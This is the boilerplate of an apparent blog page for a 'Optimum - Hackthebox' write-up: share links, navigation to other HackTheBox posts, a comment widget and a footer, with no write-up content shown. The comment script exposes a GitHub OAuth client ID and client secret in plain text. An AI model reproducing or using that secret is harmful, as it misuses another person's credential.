        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/&title=ã€ŠOptimum - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠOptimum - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/03/25/Hackthebox/Easy/Hackthebox-RouterSpace/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">RouterSpace - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/03/09/Hackthebox/Easy/Hackthebox-Beep/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Beep - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/&title=ã€ŠOptimum - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/&title=ã€ŠOptimum - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠOptimum - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuUlEQVR42u3aQW7jQAwEwPz/0w6QqyOpSQ7XG6B0WmxkSzWHGbrJr6/4ev1c1b++3q77T/WecuDCw8PDa7361fV+z/vDEt7Vi76Cq/opPDw8vH/Du9+Iq+wr0uVL3C7KPfXBgoeHh/dRXrUgrm70eVmPh4eH9xd5edFc/U48PDy8v8LrbeL35e/GpxazFjw8PLyYN9mUP/Xvxf4eHh4e3qCrnjf+kzs3guCHt8XDw8Nb4OXlbBJAJGFudT+vhrzRLwY8PDy8Ae/UcFUSN+QLWo2ALw8tPDw8vGVeb+Oulsv5MvUOmIdfDHh4eHhjXr7JTmKLXu4ajQUERxQeHh7eHu9UOds7PKphRGFB8fDw8I7yJq2maolcDWR7BfdD1oKHh4c35s0fn1N7S9MrpvHw8PD2ePNNfzIikCxQPuwVxRB4eHh4Y14eNNw3t3qfqgbH+YERnXt4eHh4A171R/48LEiok7FXPDw8vD1e3liqbtDztlaycA9BMx4eHt4aLy+Lq0V28j35YlWPEDw8PLwN3jxgrUauB7b71nADHh4e3gZvEgpMNv1eSZ0fSHh4eHjbvKTI7sUQeShcLaCjBcLDw8M7xMubXtWm/sZ4QXmoCw8PD2+NN3+hvOCu3pk/5WGaDA8PD+8Qr9q46oW8ZwcUqt+Jh4eHd5ZXLV7zjftUDFEd+cLDw8P7FC+PHsoBQRyOTA6JQh6Mh4eHV+T18s/5wEEvgOiNI+Dh4eGd5b2KV/XVc/YkjIhKajw8PLxDvFNnS/XBveWYLDEeHh7eWV5+GFTvrC5EdYGikQI8PDy8NV7evuq183vjVskJ9nAPHh4e3kd58w290PhvHTO/3ImHh4f3H/CqA1W94js/Wh6+Ew8PD2+NV40Y8sBiXkznLbRf/gcPDw9vgVdtgJ1tX+VLcKCPh4eHhzflfQOaeOQpFjsCtAAAAABJRU5ErkJggg==" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
